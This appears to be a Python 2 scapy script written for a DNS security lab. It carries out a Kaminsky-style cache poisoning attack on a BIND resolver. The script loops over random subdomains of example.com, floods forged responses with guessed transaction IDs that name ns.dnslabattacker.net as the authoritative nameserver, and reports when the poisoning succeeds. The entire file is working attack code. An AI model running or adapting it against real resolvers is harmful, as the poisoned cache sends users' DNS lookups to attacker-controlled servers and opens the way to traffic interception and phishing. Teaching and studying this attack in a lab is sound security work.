#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
query_port = args.query_port
base_domain = 'example.com'
spoof = 'ns.dnslabattacker.net.'


'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=base_domain))
    sendPacket(sock, dnsPacket, my_ip, dns_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.bind((my_ip, my_port))
    

    fake_response = DNS(id=42, qr=1, rd=1, ra=1, qdcount=1, ancount=1, nscount=1, arcount=0, 
		qd=DNSQR(qname=base_domain, qtype=1, qclass=1), 
		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4),
		ns=DNSRR(rrname=base_domain, rclass=1, ttl=70000, rdata=spoof, rdlen=len(spoof)+1, type=2)
	)
    dns_request = DNS(rd=1, qd=DNSQR(qname=base_domain))

    while (1):
        # per new url:
        url = getRandomSubDomain() + '.' + base_domain
        dns_request[DNS].qd.qname = url
        fake_response[DNS].qd.qname = url
        fake_response[DNS].an.rrname = url

        # send dns query
        sock.sendto(bytes(dns_request), (my_ip, dns_port))
        for i in range(60):
            fake_response[DNS].id = getRandomTXID()
            print "TXID = %s" % str(fake_response[DNS].id)
            sock.sendto(bytes(fake_response), (my_ip, query_port))

        # check to see if it worked
        data = sock.recv(1024)
        try:
            res = DNS(data[2:])
            if res[DNS].ns[0].rdata == spoof:
                print "Successfully poisonned our target with a dummy record !!"
                break
            else:
                print "Poisonning failed ", res[DNS].ns[0].rdata 
        except:
            print "Poisonning failed"
    

if __name__ == '__main__':
    attack()
